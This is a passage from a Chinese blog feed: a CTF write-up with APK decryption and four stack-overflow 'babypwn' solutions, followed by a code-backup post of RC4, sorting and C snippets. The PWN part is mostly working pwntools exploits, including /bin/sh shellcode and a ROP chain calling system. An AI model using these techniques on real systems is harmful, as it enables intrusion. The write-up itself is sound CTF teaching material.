class="line">              fileOutputStream.write(cipherText);</div><div class="line">              fileOutputStream.close();</div><div class="line">          &#125;catch (Exception e) &#123;</div><div class="line">// TODO: handle exception</div><div class="line">&#125;</div><div class="line">          System.out.println(&quot;done&quot;);</div><div class="line">  </div><div class="line"></div><div class="line">   &#125;</div><div class="line"></div><div class="line">   </div><div class="line">   public static void main(String[] args) throws IOException &#123;</div><div class="line">   String password = &quot;Password&quot;;</div><div class="line">   byte[] key = md5(password);</div><div class="line">   String path=&quot;F:/CTF/timu/期末/RE/apk2/flag.enc&quot;;</div><div class="line">   byte[] data=readUri(path);</div><div class="line">   byte[] data1=encryptData(data,key);</div><div class="line">   decode(data1);</div><div class="line">   </div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>然后用010打开，发现是一个压缩包，解压得到flag<br>flag{This_easy_encrypto_t0_file<em>hi$!&gt;</em>&lt;}</p><h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="1、babypwn1"><a href="#1、babypwn1" class="headerlink" title="1、babypwn1"></a>1、babypwn1</h2><p>程序就不放了，这里可以下载（<a href="https://betamao.me）" target="_blank" rel="external">https://betamao.me）</a><br>分析程序，检查发现程序无任何保护<br><img src="https://i.imgur.com/52gZ58m.png" alt=""><br>我们只需要v5=abcd,就可以得到shell(意味着拿到flag),但v5=233了，所以这里我们需要覆盖v5的值<br>这里第一个箭头是函数的栈顶eps=0x3f4(同时我们输入的s也是存放在这里),第二个箭头v5=0xc,所以我们算出两者的距离d=0x3f4-0xc=1000，就可以覆盖了，构造payload(小端序，v5是int型的)：<br><code>payload = &#39;a&#39;*1000+&#39;dcba&#39;</code><br>测试成功poc.py<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">p = process(<span class="string">'./babypwn1'</span>)</div><div class="line">payload = <span class="string">'a'</span>*<span class="number">1000</span>+<span class="string">'dcba'</span></div><div class="line">p.recv()</div><div class="line">p.sendline(payload)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure></p><h2 id="2、babypwn2"><a href="#2、babypwn2" class="headerlink" title="2、babypwn2"></a>2、babypwn2</h2><p>分析程序，检查发现程序无任何保护<br>发现这个函数，同时发现getShell函数<br><img src="https://i.imgur.com/WyLpecF.png" alt=""><br>那我们只有覆盖返回地址到getShell函数就好啦，发现函数栈帧0x3f4=1012,函数栈是这样的：<br><img src="https://i.imgur.com/3xoBk7P.png" alt=""><br>那么我们只需要输入1012+4+ret(getShell的地址)就成功啦<br>测试成功poc.py<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">p = process(<span class="string">'babypwn2'</span>)</div><div class="line">elf=ELF(<span class="string">'babypwn2'</span>)</div><div class="line">ret=elf.symbols[<span class="string">'getShell'</span>]</div><div class="line">payload = <span class="string">'a'</span>*<span class="number">1016</span> +p32(ret)</div><div class="line">p.recv()</div><div class="line">p.sendline(payload)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure></p><h2 id="3、babypwn3"><a href="#3、babypwn3" class="headerlink" title="3、babypwn3"></a>3、babypwn3</h2><p>分析程序，检查发现程序无任何保护<br>发现存在溢出，并且当v2=127的时候，会去执行输入的代码<br><img src="https://i.imgur.com/McHlAzO.png" alt=""><br>可是这里溢出后并没有执行得到shell的函数，因为没有任何保护，所以栈上的代码可以执行。那么我们就自己写一个执行shell的代码输入就可以了——shellcode，可以在网上找，它的功能就是system(“/bin/sh”)<br>方法一<br>1、输入shellcode<br>2、覆盖v7=127<br>测试成功poc.py<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">shellcode = <span class="string">"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"</span>;</div><div class="line">p=process(<span class="string">'./babypwn3'</span>)</div><div class="line">payload = shellcode+<span class="string">'a'</span>*(<span class="number">127</span>-len(shellcode))+p32(<span class="number">127</span>)</div><div class="line">p.recv()</div><div class="line">p.sendline(payload)</div><div class="line">raw_input()</div><div class="line">p.interactive()</div></pre></td></tr></table></figure></p><p>方法二<br>1、存在jmp esp指令<br>2、栈溢出到jmp esp位置，执行shellcode<br>测试成功poc.py<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">shellcode = <span class="string">"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"</span>;</div><div class="line">p=process(<span class="string">'./babypwn3'</span>)</div><div class="line">jmp_esp=<span class="number">0x8048500</span></div><div class="line">payload = <span class="string">'a'</span>*<span class="number">140</span>+p32(jmp_esp)+shellcode</div><div class="line">p.recv()</div><div class="line">p.sendline(payload)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure></p><h2 id="4、babypwn4"><a href="#4、babypwn4" class="headerlink" title="4、babypwn4"></a>4、babypwn4</h2><p>分析程序，检查发现程序只有NX保护<br>潘师傅说这道题出题有点失误，但是还是很基础的，这里我就把我当poc.py献给大家<br>测试成功poc.py<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">p = process(<span class="string">'babypwn4'</span>)</div><div class="line">elf=ELF(<span class="string">'babypwn4'</span>)</div><div class="line">bss=elf.bss()</div><div class="line">read_plt=elf.plt[<span class="string">'read'</span>]</div><div class="line">system_plt=elf.plt[<span class="string">'system'</span>]</div><div class="line">pppr=<span class="number">0x8048639</span></div><div class="line"></div><div class="line">payload = <span class="string">'a'</span>*<span class="number">245</span> +p32(read_plt)+p32(pppr)+p32(<span class="number">0</span>)+p32(bss)+p32(<span class="number">8</span>)+p32(system_plt)+p32(<span class="number">1</span>)+p32(bss)</div><div class="line">p.recv()</div><div class="line">p.sendline(payload)</div><div class="line">p.sendline(<span class="string">'/bin/sh'</span>)</div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure></p><p>这里我要睡觉了，就不解释了。有任何问题欢迎来问</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这次比赛，有点坑逆向选手，再次感谢各位宽容大方善良美丽可爱小伙伴们。。。。&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>代码备份</title>
    <link href="http://yoursite.com/2017/12/05/re_code/"/>
    <id>http://yoursite.com/2017/12/05/re_code/</id>
    <published>2017-12-05T11:48:44.582Z</published>
    <updated>2018-04-04T08:40:12.324Z</updated>
    
    <content type="html"><![CDATA[<p>记录一下代码，方便使用<br><a id="more"></a></p><h1 id="1、java"><a href="#1、java" class="headerlink" title="1、java"></a>1、java</h1><h2 id="re4"><a href="#re4" class="headerlink" title="re4"></a>re4</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">HloveyRC4</span><span class="params">(String aInput,String aKey)</span>   </span></div><div class="line"><span class="function">   </span>&#123;   </div><div class="line">       <span class="keyword">int</span>[] iS = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">256</span>];   </div><div class="line">       <span class="keyword">byte</span>[] iK = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">256</span>];   </div><div class="line">         </div><div class="line">       <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">256</span>;i++)   </div><div class="line">           iS[i]=i;   </div><div class="line">             </div><div class="line">       <span class="keyword">int</span> j = <span class="number">1</span>;   </div><div class="line">         </div><div class="line">       <span class="keyword">for</span> (<span class="keyword">short</span> i= <span class="number">0</span>;i&lt;<span class="number">256</span>;i++)   </div><div class="line">       &#123;   </div><div class="line">           iK[i]=(<span class="keyword">byte</span>)aKey.charAt((i % aKey.length()));   </div><div class="line">       &#125;   </div><div class="line">         </div><div class="line">       j=<span class="number">0</span>;   </div><div class="line">         </div><div class="line">       <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">255</span>;i++)   </div><div class="line">       &#123;   </div><div class="line">           j=(j+iS[i]+iK[i]) % <span class="number">256</span>;   </div><div class="line">           <span class="keyword">int</span> temp = iS[i];   </div><div class="line">           iS[i]=iS[j];   </div><div class="line">           iS[j]=temp;   </div><div class="line">       &#125;   </div><div class="line">     </div><div class="line">     </div><div class="line">       <span class="keyword">int</span> i=<span class="number">0</span>;   </div><div class="line">       j=<span class="number">0</span>;   </div><div class="line">       <span class="keyword">char</span>[] iInputChar = aInput.toCharArray();   </div><div class="line">       <span class="keyword">char</span>[] iOutputChar = <span class="keyword">new</span> <span class="keyword">char</span>[iInputChar.length];   </div><div class="line">       <span class="keyword">for</span>(<span class="keyword">short</span> x = <span class="number">0</span>;x&lt;iInputChar.length;x++)   </div><div class="line">       &#123;   </div><div class="line">           i = (i+<span class="number">1</span>) % <span class="number">256</span>;   </div><div class="line">           j = (j+iS[i]) % <span class="number">256</span>;   </div><div class="line">           <span class="keyword">int</span> temp = iS[i];   </div><div class="line">           iS[i]=iS[j];   </div><div class="line">           iS[j]=temp;   </div><div class="line">           <span class="keyword">int</span> t = (iS[i]+(iS[j] % <span class="number">256</span>)) % <span class="number">256</span>;   </div><div class="line">           <span class="keyword">int</span> iY = iS[t];   </div><div class="line">           <span class="keyword">char</span> iCY = (<span class="keyword">char</span>)iY;   </div><div class="line">           iOutputChar[x] =(<span class="keyword">char</span>)( iInputChar[x] ^ iCY) ;      </div><div class="line">       &#125;   </div><div class="line">         </div><div class="line">       <span class="keyword">return</span> <span class="keyword">new</span> String(iOutputChar);   </div><div class="line">                 </div><div class="line">   &#125;  </div><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</div><div class="line">  String inputStr = <span class="string">"7894dsfdsdfsd"</span>;      </div><div class="line">    String key = <span class="string">"abcdefg"</span>;         </div><div class="line">      </div><div class="line">    String str = HloveyRC4(inputStr,key);  </div><div class="line">      </div><div class="line">    <span class="comment">//打印加密后的字符串      </span></div><div class="line">    System.out.println(str);    </div><div class="line">      </div><div class="line">    <span class="comment">//打印解密后的字符串      </span></div><div class="line">    System.out.println(HloveyRC4(str,key));    </div><div class="line">&#125;</div></pre></td></tr></table></figure><h2 id="byte和Strings互转"><a href="#byte和Strings互转" class="headerlink" title="byte和Strings互转"></a>byte和Strings互转</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">String str = &quot;hello&quot;;</div><div class="line">byte[] srtbyte = null;</div><div class="line">try &#123;</div><div class="line">srtbyte = str.getBytes(&quot;UTF-8&quot;);</div><div class="line">String res = new String(srtbyte,&quot;UTF-8&quot;);</div><div class="line">System.out.println(res);</div><div class="line">    &#125; catch (UnsupportedEncodingException e) &#123;</div><div class="line">e.printStackTrace();</div><div class="line">    &#125;</div></pre></td></tr></table></figure><h1 id="2、python"><a href="#2、python" class="headerlink" title="2、python"></a>2、python</h1><p>8种排序，插入排序、希尔排序、冒泡排序、快速排序、直接选择排序、堆排序、归并排序、基数排序。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#直接爆破</span></div><div class="line"><span class="keyword">import</span> string </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">func1</span><span class="params">(n)</span>:</span></div><div class="line">r = n</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">7</span>):</div><div class="line"><span class="keyword">if</span> i&amp;<span class="number">1</span>:</div><div class="line">r ^= <span class="number">1</span>&lt;&lt; i</div><div class="line"><span class="keyword">else</span>:</div><div class="line">r |= <span class="number">1</span>&lt;&lt; i</div><div class="line"><span class="keyword">return</span> r</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">func2</span><span class="params">(n)</span>:</span></div><div class="line">r = <span class="number">1</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</div><div class="line">r = (n*r)%<span class="number">481</span></div><div class="line"><span class="keyword">return</span> r</div><div class="line">enc=[<span class="number">0x19C</span>,<span class="number">0x169</span>,<span class="number">0x30</span>,<span class="number">0x1D6</span>,<span class="number">0x30</span>,<span class="number">0x30</span>,<span class="number">0x199</span>,<span class="number">0x6A</span>,<span class="number">0x157</span>,<span class="number">0xc2</span>,</div><div class="line"><span class="number">0x10A</span>,<span class="number">0x155</span>,<span class="number">0x150</span>,<span class="number">0x107</span>,<span class="number">0x37</span>,<span class="number">0x12E</span>,<span class="number">0x22</span>,<span class="number">0x0F1</span>,<span class="number">0x1AE</span>,</div><div class="line"><span class="number">0x151</span>,<span class="number">0x0F1</span>,<span class="number">0x1A</span>,<span class="number">0x1A5</span>,<span class="number">0x1AE</span>,<span class="number">0x0C9</span>,<span class="number">0x12C</span>,<span class="number">0x1</span>,<span class="number">0x166</span>,<span class="number">0x12c</span>,</div><div class="line"><span class="number">0x0CB</span>,<span class="number">0x30</span>,<span class="number">0x107</span>,<span class="number">0x166</span>,<span class="number">0x1B4</span>,<span class="number">0x1AE</span>,<span class="number">0x14C</span>,<span class="number">0x46</span>]</div><div class="line">out =<span class="string">''</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(enc)):</div><div class="line"><span class="keyword">for</span> c <span class="keyword">in</span> string.printable:</div><div class="line">s = ord(c) ^ func1(i)</div><div class="line">s = func2(s)</div><div class="line"><span class="keyword">if</span> s == enc[i]:</div><div class="line">out+=c</div><div class="line"><span class="keyword">break</span></div><div class="line"><span class="keyword">print</span> out</div><div class="line"></div><div class="line"><span class="comment">#插入排序,时间复杂度为O(n^2)。是稳定的排序方法。</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">insert_sort</span><span class="params">(lst)</span>:</span></div><div class="line">    count=len(lst)</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,count):</div><div class="line">        key=lst[i]</div><div class="line">        j=i<span class="number">-1</span></div><div class="line">        <span class="keyword">while</span> j&gt;=<span class="number">0</span>:</div><div class="line">            <span class="keyword">if</span> lst[j]&gt;key:</div><div class="line">                lst[j+<span class="number">1</span>]=lst[j]</div><div class="line">                lst[j]=key</div><div class="line">            j-=<span class="number">1</span></div><div class="line">    <span class="keyword">return</span> lst</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># 希尔排序是插入排序的一种希尔排序是非稳定排序算法</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">shell_sort</span><span class="params">(lst)</span>:</span></div><div class="line">    count = len(lst)</div><div class="line">    step = <span class="number">2</span></div><div class="line">    group = count / step</div><div class="line">    <span class="keyword">while</span> group &gt; <span class="number">0</span>:</div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, group):</div><div class="line">            j = i + group</div><div class="line">            <span class="keyword">while</span> j &lt; count:</div><div class="line">                k = j - group</div><div class="line">                key = lst[j]</div><div class="line">                <span class="keyword">while</span> k &gt;= <span class="number">0</span>:</div><div class="line">                    <span class="keyword">if</span> lst[k] &gt; key:</div><div class="line">                        lst[k + group] = lst[k]</div><div class="line">                        lst[k] = key</div><div class="line">                    k -= group</div><div class="line">                j += group</div><div class="line">        group /= step</div><div class="line">    <span class="keyword">return</span> lst</div><div class="line"></div><div class="line"><span class="comment"># 冒泡排序</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">bubble_sort</span><span class="params">(lst)</span>:</span></div><div class="line">    count = len(lst)</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, count):</div><div class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(i + <span class="number">1</span>, count):</div><div class="line">            <span class="keyword">if</span> lst[i] &gt; lst[j]:</div><div class="line">                lst[i], lst[j] = lst[j], lst[i]</div><div class="line">    <span class="keyword">return</span> lst</div><div class="line"></div><div class="line"><span class="comment"># 选择排序</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">select_sort</span><span class="params">(lst)</span>:</span></div><div class="line">    count = len(lst)</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, count):</div><div class="line">        min = i</div><div class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(i + <span class="number">1</span>, count):</div><div class="line">            <span class="keyword">if</span> lst[min] &gt; lst[j]:</div><div class="line">                min = j</div><div class="line">        lst[min], lst[i] = lst[i], lst[min]</div><div class="line">    <span class="keyword">return</span> lst</div><div class="line"></div><div class="line"><span class="comment"># 快速排序,整个排序过程可以递归进行</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">quick_sort</span><span class="params">(lst, left, right)</span>:</span></div><div class="line">    <span class="keyword">if</span> left &gt;= right:</div><div class="line">        <span class="keyword">return</span> lst</div><div class="line">    key = lst[left]</div><div class="line">    low = left</div><div class="line">    high = right</div><div class="line">    <span class="keyword">while</span> left &lt; right:</div><div class="line">        <span class="keyword">while</span> left &lt; right <span class="keyword">and</span> lst[right] &gt;= key:</div><div class="line">            right -= <span class="number">1</span></div><div class="line">        lst[left] = lst[right]</div><div class="line">        <span class="keyword">while</span> left &lt; right <span class="keyword">and</span> lst[left] &lt;= key:</div><div class="line">            left += <span class="number">1</span></div><div class="line">        lst[right] = lst[left]</div><div class="line">    lst[right] = key</div><div class="line">    quick_sort(lst, low, left - <span class="number">1</span>)</div><div class="line">    quick_sort(lst, left + <span class="number">1</span>, high)</div><div class="line">    <span class="keyword">return</span> lst</div><div class="line"></div><div class="line"><span class="comment">#堆排序是指利用堆积树数据结构,它是选择排序的一种,堆分为大根堆和小根堆，是完全二叉树,大根堆的要求是每个节点的值都不大于其父节点的值</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">adjust_heap</span><span class="params">(lst, i, size)</span>:</span></div><div class="line">    lchild = <span class="number">2</span> * i + <span class="number">1</span></div><div class="line">    rchild = <span class="number">2</span> * i + <span class="number">2</span></div><div class="line">    max = i</div><div class="line">    <span class="keyword">if</span> i &lt; size / <span class="number">2</span>:</div><div class="line">        <span class="keyword">if</span> lchild &lt; size <span class="keyword">and</span> lst[lchild] &gt; lst[max]:</div><div class="line">            max = lchild</div><div class="line">        <span class="keyword">if</span> rchild &lt; size <span class="keyword">and</span> lst[rchild] &gt; lst[max]:</div><div class="line">            max = rchild</div><div class="line">        <span class="keyword">if</span> max != i:</div><div class="line">            lst[max], lst[i] = lst[i], lst[max]</div><div class="line">            adjust_heap(lst, max, size)</div><div class="line"> </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">build_heap</span><span class="params">(lst, size)</span>:</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, (size/<span class="number">2</span>))[::<span class="number">-1</span>]:</div><div class="line">        adjust_heap(lst, i, size)</div><div class="line"> </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">heap_sort</span><span class="params">(lst)</span>:</span></div><div class="line">    size = len(lst)</div><div class="line">    build_heap(lst, size)</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, size)[::<span class="number">-1</span>]:</div><div class="line">        lst[<span class="number">0</span>], lst[i] = lst[i], lst[<span class="number">0</span>]</div><div class="line">        adjust_heap(lst, <span class="number">0</span>, i)</div><div class="line"></div><div class="line"><span class="comment">#归并排序</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">merge</span><span class="params">(left, right)</span>:</span></div><div class="line">    i, j = <span class="number">0</span>, <span class="number">0</span></div><div class="line">    result = []</div><div class="line">    <span class="keyword">while</span> i &lt; len(left) <span class="keyword">and</span> j &lt; len(right):</div><div class="line">        <span class="keyword">if</span> left[i] &lt;= right[j]:</div><div class="line">            result.append(left[i])</div><div class="line">            i += <span class="number">1</span></div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            result.append(right[j])</div><div class="line">            j += <span class="number">1</span></div><div class="line">    result += left[i:]</div><div class="line">    result += right[j:]</div><div class="line">    <span class="keyword">return</span> result</div><div class="line"> </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">merge_sort</span><span class="params">(lst)</span>:</span></div><div class="line">    <span class="comment"># 归并排序</span></div><div class="line">    <span class="keyword">if</span> len(lst) &lt;= <span class="number">1</span>:</div><div class="line">        <span class="keyword">return</span> lst</div><div class="line">    num = len(lst) / <span class="number">2</span></div><div class="line">    left = merge_sort(lst[:num])</div><div class="line">    right = merge_sort(lst[num:])</div><div class="line"></div><div class="line"><span class="comment">#基数排序</span></div><div class="line"><span class="keyword">import</span> math</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">radix_sort</span><span class="params">(lst, radix=<span class="number">10</span>)</span>:</span></div><div class="line">    k = int(math.ceil(math.log(max(lst), radix)))</div><div class="line">    bucket = [[] <span class="keyword">for</span> i <span class="keyword">in</span> range(radix)]</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, k+<span class="number">1</span>):</div><div class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> lst:</div><div class="line">            bucket[j/(radix**(i<span class="number">-1</span>)) % (radix**i)].append(j)</div><div class="line">        <span class="keyword">del</span> lst[:]</div><div class="line">        <span class="keyword">for</span> z <span class="keyword">in</span> bucket:</div><div class="line">            lst += z</div><div class="line">            <span class="keyword">del</span> z[:]</div><div class="line">    <span class="keyword">return</span> lst</div></pre></td></tr></table></figure></p><h1 id="3、java-apk"><a href="#3、java-apk" class="headerlink" title="3、java(apk)"></a>3、java(apk)</h1><h2 id="1、将字符串写在strings-xml里面"><a href="#1、将字符串写在strings-xml里面" class="headerlink" title="1、将字符串写在strings.xml里面"></a>1、将字符串写在strings.xml里面</h2><p>开发<br>apk-&gt;app-&gt;src-&gt;main-&gt;res-&gt;values-&gt;strings.xml<br><code>&lt;string name=&quot;user_name&quot;&gt;ESE_1996&lt;/string&gt;</code><br><code>name.getText().toString().equals(getResources().getString(R.string.user_name))</code><br>做题<br>Resources-&gt;resources.arsc-&gt;res-&gt;values-&gt;string.xml</p><h1 id="4、C"><a href="#4、C" class="headerlink" title="4、C"></a>4、C</h1><h2 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;time.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;fcntl.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/stat.h&gt; </span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">( <span class="keyword">void</span> )</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    FILE *stream;</div><div class="line">    <span class="keyword">char</span> <span class="built_in">list</span>[<span class="number">20000</span>];</div><div class="line">    <span class="keyword">int</span> start,end,fd,size;</div><div class="line">    <span class="keyword">int</span> i, numread, numwritten;</div><div class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i 